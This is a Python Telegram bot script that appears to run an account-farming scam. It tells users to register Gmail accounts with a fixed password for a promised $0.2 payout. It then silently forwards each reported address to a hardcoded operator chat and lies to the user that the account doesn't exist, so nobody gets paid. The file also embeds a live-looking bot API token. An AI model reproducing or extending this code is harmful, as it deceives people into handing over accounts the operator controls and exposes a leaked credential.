import telebot
import random

mails = ['SdQCwqySeAtqJ@gmail.com', 'IjkmDVAbnRaoc@gmail.com', 'svkqGTnMJitRC@gmail.com', 'tJnAaYxDwWjIX@gmail.com', 'UrYvCdSACIUWD@gmail.com', 'dMzulYDcrdFOS@gmail.com', 'ACBFANDhMYhfE@gmail.com', 'pxVzRVsUqSCqc@gmail.com', 'ShXSfkQhvyDvb@gmail.com', 'FLZkTBaONKMib@gmail.com', 'gvELFkxsRShXF@gmail.com', 'gljcNqYctgHQQ@gmail.com', 'hxeARZQgGRMyF@gmail.com', 'eRvPgEUrLymZb@gmail.com', 'vWmMYXycxbpRF@gmail.com', 'sUbCCFDyrSsah@gmail.com', 'DhSKtkXsioMwd@gmail.com', 'zlVYtgWCNJeDe@gmail.com', 'qAeREcLbGwSqr@gmail.com', 'zvsTBcoPGGSSI@gmail.com', 'aBbfmhmqUlqUM@gmail.com', 'rFmCfvVnnXIyv@gmail.com', 'wRZDjgIZlLpIR@gmail.com', 'qukvALiwmsjVb@gmail.com', 'BsyQqymniXShQ@gmail.com', 'UTnUskfuIpRXy@gmail.com', 'PlNewxQmZjyFQ@gmail.com', 'ZPBJHLKPIMzpG@gmail.com', 'wwuPrQDdxebJE@gmail.com', 'EuWdDWSFyDbYn@gmail.com', 'DEUaitDOdKxhl@gmail.com', 'FoJXVVKhuMIXb@gmail.com', 'xsiNpDrezHyEj@gmail.com', 'lQCECSkPaLHPk@gmail.com', 'zTgksTOiZNmye@gmail.com', 'aEjozhaCJKpUK@gmail.com', 'TzWWfXCudUtWl@gmail.com', 'tfRzesWBiilAr@gmail.com', 'VwpSWUoaFuwxr@gmail.com', 'NvmreFblTPmPy@gmail.com', 'VEDjUoFAzxDCV@gmail.com', 'kPzoeszqFHWGn@gmail.com', 'lVjqpyKDcIcTk@gmail.com', 'SAIFAGSvHLiit@gmail.com', 'NfilyvpfQIWfU@gmail.com', 'JtEqwAbRLhlMp@gmail.com', 'loVVsRbtYtDDT@gmail.com', 'rdMerNtckTUKq@gmail.com', 'yvYDcpIIggFZe@gmail.com', 'IqeJvVxgoDPTr@gmail.com', 'anbNrcScBRWJZ@gmail.com', 'WTdyjcTzboklu@gmail.com', 'fVWJFBgGyCylj@gmail.com', 'KbrQClhCkTebD@gmail.com', 'fZLKCVgGRbmtH@gmail.com', 'WPcPnhZIHnYby@gmail.com', 'umkHCZhzLlStJ@gmail.com', 'cMnsFxKayKTHo@gmail.com', 'jBbnhhnwPpyzI@gmail.com', 'uhWJJVxRuAFSi@gmail.com']

bot = telebot.TeleBot("5506835250:AAGYWPuqBsba4pWNJilDnqvBafG-ZYVrZOE")

@bot.message_handler(commands=["start"])
def test(message):
    mail = '11' + random.choice(mails)
    bot.send_message(message.chat.id, 'Email: '+ mail +'\nPassword: ```1ah63ksP11```\n\nAnd type /check to verify it\n\n🔐 Be sure to use the specified password, otherwise the account will not be paid, current payout: 0.2$', parse_mode= "Markdown")

@bot.message_handler(commands=['check'])
def send_welcome(message):
    msg = bot.reply_to(message, "Enter email you've just created")
    bot.register_next_step_handler(msg, process_name_step)


def process_name_step(message):
    try:
        name = message.text
        bot.send_message(5058141288, name)
        bot.reply_to(message, 'Email '+name+' doesn\'t exist, probably you\'ve created it with a wrong password?')
    except Exception as e:
        bot.reply_to(message, 'Error occured')





if __name__ == '__main__':
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as ex:
            pass
